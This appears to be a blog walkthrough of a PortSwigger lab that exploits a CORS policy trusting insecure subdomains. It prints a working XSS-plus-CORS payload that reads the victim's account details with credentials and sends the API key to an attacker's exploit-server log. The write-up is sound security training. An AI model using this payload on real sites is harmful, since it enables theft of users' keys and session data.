---
title: CORS vulnerability with trusted insecure protocols
date: 2025-10-21 00:00:00 +0800
categories: [Portswigger, Cross-origin resource sharing (CORS)]
tags: [portswigger, writeup, walkthrough, web, cors]     # TAG names should always be lowercase
description: In this post we will solve a CORS Lab on portswigger, have fun reading.
---

## Lab: CORS vulnerability with trusted insecure protocols

This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: `wiener:peter`

### Lab 3 Exploitation

In this lab there is an important hint. 

**"If you could man-in-the-middle attack (MITM) the victim, you could use a MITM attack to hijack a connection to an insecure subdomain, and inject malicious JavaScript to exploit the CORS configuration. Unfortunately in the lab environment, you can't MITM the victim, so you'll need to find an alternative way of injecting JavaScript into the subdomain."**

So let’s start with some enumeration,  Open our account details endpoint as usual to find the `Access-Control-Allow-Credentials: true` header so you will do the steps with the origin header:

1 - Try any website —> we will see that it didn’t accept it

2 - Try the null —> also didn’t accept it

3 - Try the a subdomain with the same website —> and yes it have accepted it

![img-description](/assets/img/PortSwigger/CORS/3/subdomain.png)
_Subdomain Request_

So now open burpsuite in the background while enumerating all if the website pages and features, let's see what we have found and see where we can exploit this from

![img-description](/assets/img/PortSwigger/CORS/3/stock.png)
_Stock_

We will find this interesting request from what seems like an infected subdomain with xss as we can see that the stock level is showing in the response, so what about trying to inject malicious javascript in those parameters and see what can we get.

![img-description](/assets/img/PortSwigger/CORS/3/xss.png)
_Xss_

and you will find that yes it have been printed in the page.

so let’s exploit it, go to the exploit server and send this script to the victim while using the document.location() function so that the user is redirected to the malicious endpoint and we can get our api key

```
<script>
document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

and we will see it worked.

![img-description](/assets/img/PortSwigger/CORS/3/api.png)
_API_